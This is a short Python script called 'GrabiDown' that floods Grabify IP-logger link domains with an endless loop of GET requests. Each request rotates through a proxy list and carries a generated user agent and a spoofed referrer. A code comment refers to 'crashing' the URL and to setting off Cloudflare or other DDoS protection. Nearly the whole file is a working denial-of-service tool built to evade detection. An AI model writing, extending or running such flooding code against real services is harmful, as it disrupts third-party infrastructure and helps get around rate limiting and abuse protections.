from colorama import Fore, init
from random import choice
import user_agent
import requests
import os

init(autoreset=True)

class GrabiDown:
    def __init__(this):
        this._session = requests.Session()
        this._common_domains = [
            "grabify.link",
            "photovault.pics",
            "bathtub.pics",
            "foot.wiki",
            "thisdomainislong.lol",
            "gamergirl.pro",
            "picshost.pics",
        ]
        this._ref = open("./data/ref.txt", "r").read().splitlines()
        this._proxies = open("./data/proxies.txt", "r").read().splitlines()
        this._proxy = ""
        this._referrer = ""
        this._res = 0

    def flood(this, _url: str):
        try:
            this._proxy = choice(this._proxies)
            this._referrer = choice(this._ref)
            if _url.split("//")[1].split("/")[0] not in this._common_domains:
                return "Invalid Domain."
            this._res = this._session.get(
                _url,
                headers={
                    "user_agent": user_agent.generate_user_agent(),
                    "referrer": this._referrer,
                },
                proxies={
                    "http": f"http://{this._proxy}",
                    "https": f"http://{this._proxy}",
                },
                allow_redirects=True,
            ).status_code
            os.system("clear")
            if this._res == 200:
                return f"Request {Fore.RED}Sent{Fore.RESET}\nProxy: {Fore.MAGENTA}{this._proxy}{Fore.RESET}\nStatus: {Fore.GREEN}{this._res}{Fore.RESET}"  # a bad status_code may not always indicate the url was crashed, it might indicate such things as cloudflare being triggered or any other ddos protection.
            return f"Request {Fore.RED}Sent{Fore.RESET}\nProxy: {Fore.MAGENTA}{this._proxy}{Fore.RESET}\nStatus: {Fore.YELLOW}{this._res}{Fore.RESET}"
        except Exception as e:
            pass


if __name__ == "__main__":
    while True:
        _flood = GrabiDown().flood("https://url")
        print(_flood)
